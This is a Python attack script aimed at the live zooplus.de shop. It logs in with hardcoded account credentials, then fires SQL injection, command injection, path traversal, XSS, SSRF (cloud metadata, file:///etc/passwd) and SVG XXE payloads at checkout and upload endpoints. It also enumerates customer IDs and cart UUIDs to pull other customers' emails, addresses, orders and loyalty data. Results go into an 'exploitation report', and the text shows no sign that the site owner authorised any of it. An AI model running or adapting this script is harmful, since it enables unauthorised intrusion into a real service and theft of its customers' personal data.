#!/usr/bin/env python3
"""Aggressive vulnerability hunting"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. Deep test state-api - known IDOR endpoint
print("[*] Deep testing state-api...")
cart_uuid = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"  # From browser

# Test set-article-quantity with malicious payloads
malicious_payloads = [
    {"articleId": "'; DROP TABLE--", "quantity": 1},
    {"articleId": "1 OR 1=1", "quantity": 1},
    {"articleId": "../../../etc/passwd", "quantity": 1},
    {"articleId": "1; cat /etc/passwd", "quantity": 1},
    {"articleId": "<script>alert(1)</script>", "quantity": 1},
    {"articleId": "1", "quantity": -999999},
    {"articleId": "1", "quantity": 999999999},
    {"articleId": "1", "quantity": "'; DROP TABLE--"},
    {"articleId": "1", "quantity": "1 OR 1=1"},
]

for payload in malicious_payloads:
    try:
        resp = s.post(
            f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity",
            json=payload,
            timeout=3,
            verify=False
        )
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            data_str = json.dumps(data)
            
            # Check for injection success
            if "error" in data_str.lower() and ("sql" in data_str.lower() or "syntax" in data_str.lower()):
                print(f"  [HIGH] Possible injection in state-api: {payload}")
                found_vulns.append({
                    "type": "injection",
                    "severity": "HIGH",
                    "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                    "payload": payload
                })
            # Check for negative quantity acceptance
            elif payload.get("quantity") == -999999 and "quantity" in data_str and "-999999" in data_str:
                print(f"  [HIGH] Negative quantity accepted: {payload}")
                found_vulns.append({
                    "type": "business_logic",
                    "severity": "HIGH",
                    "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                    "payload": payload
                })
    except: pass

# 2. Test state-api/get for SSRF
print("\n[*] Testing state-api/get for SSRF...")
ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/admin",
    "file:///etc/passwd",
]

for payload in ssrf_payloads:
    try:
        resp = s.post(
            f"{base}/semiprotected/api/checkout/state-api/v2/get",
            json={"url": payload, "callback": payload, "endpoint": payload},
            timeout=3,
            verify=False
        )
        if resp.status_code == 200:
            if "169.254.169.254" in resp.text or "instance-id" in resp.text.lower() or "root:" in resp.text:
                print(f"  [CRITICAL] SSRF in state-api/get: {payload}")
                found_vulns.append({
                    "type": "ssrf",
                    "severity": "CRITICAL",
                    "endpoint": "/semiprotected/api/checkout/state-api/v2/get",
                    "payload": payload
                })
    except: pass

# 3. Test cart-api for IDOR
print("\n[*] Testing cart-api for IDOR...")
# Try to access other user's cart
other_cart_uuids = [
    "00000000-0000-0000-0000-000000000000",
    "11111111-1111-1111-1111-111111111111",
    "6bd223b4-5040-4faa-ba85-6a85c1ec2d50",  # Our cart
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
]

for cart_uuid in other_cart_uuids:
    try:
        resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{cart_uuid}", timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(data, dict) and data:
                data_str = json.dumps(data)
                # Check if we got cart data
                if any(key in data_str.lower() for key in ['article', 'item', 'product', 'price', 'total']):
                    print(f"  [CRITICAL] IDOR in cart-api: {cart_uuid}")
                    found_vulns.append({
                        "type": "idor",
                        "severity": "CRITICAL",
                        "endpoint": f"/checkout/api/cart-api/v2/cart/{cart_uuid}",
                        "cart_uuid": cart_uuid,
                        "data": data_str[:500]
                    })
    except: pass

# 4. Test for file upload in various endpoints
print("\n[*] Testing file upload in various endpoints...")
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

upload_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/upload",
    "/checkout/api/cart-api/v2/upload",
    "/checkout/api/cart-api/v2/file",
    "/myaccount/api/upload",
    "/myaccount/api/file",
    "/semiprotected/api/audiences-api/v1/upload",
    "/zootopia-events/api/upload",
    "/leto-personalization/api/v1/upload",
]

for ep in upload_endpoints:
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text or "root:x:0:0" in resp.text:
                print(f"  [CRITICAL] SVG XXE: {ep}")
                found_vulns.append({
                    "type": "svg_xxe_lfi",
                    "severity": "CRITICAL",
                    "endpoint": ep
                })
            elif resp.headers.get('Location'):
                loc = resp.headers.get('Location')
                if not loc.startswith('http'):
                    loc = f"{base}{loc}"
                try:
                    resp2 = s.get(loc, timeout=3, verify=False)
                    if "root:" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via uploaded file: {ep} -> {loc}")
                        found_vulns.append({
                            "type": "svg_xxe_lfi",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "uploaded_to": loc
                        })
                except: pass
    except: pass

# 5. Test for real customer data access
print("\n[*] Testing customer data access...")
customer_ids = [53260509, 53260633, 1, 2, 100, 999, 1000, 9999, 99999, 999999]

for customer_id in customer_ids:
    endpoints = [
        f"/myaccount/api/customer-config/v1/customerconfiguration/{customer_id}",
        f"/myaccount/api/order-details/v3/customer/{customer_id}",
        f"/protected/api/loyalty-management/bonus-points/customer/{customer_id}",
        f"/protected/api/loyalty-management/memberships/customer/{customer_id}",
    ]
    for ep in endpoints:
        try:
            resp = s.get(f"{base}{ep}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    # Check for real user data
                    if any(key in data_str.lower() for key in ['email', 'name', 'address', 'phone', 'order', 'balance', 'points', 'membership']):
                        print(f"  [CRITICAL] IDOR - Customer data: {ep}")
                        print(f"      Data: {data_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "customer_id": customer_id,
                            "data": data_str[:500]
                        })
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'payload' in v:
            print(f"    Payload: {json.dumps(v['payload'])}")
        if 'customer_id' in v:
            print(f"    Customer ID: {v['customer_id']}")
        if 'cart_uuid' in v:
            print(f"    Cart UUID: {v['cart_uuid']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 РЕАЛЬНЫЕ УЯЗВИМОСТИ НАЙДЕНЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{json.dumps(v['payload'])}`\n\n")
            if 'customer_id' in v:
                f.write(f"**Customer ID:** `{v['customer_id']}`\n\n")
            if 'cart_uuid' in v:
                f.write(f"**Cart UUID:** `{v['cart_uuid']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded File Location:** `{v['uploaded_to']}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No vulnerabilities found in this round")
    print("  Continuing search...")

print("=" * 70)

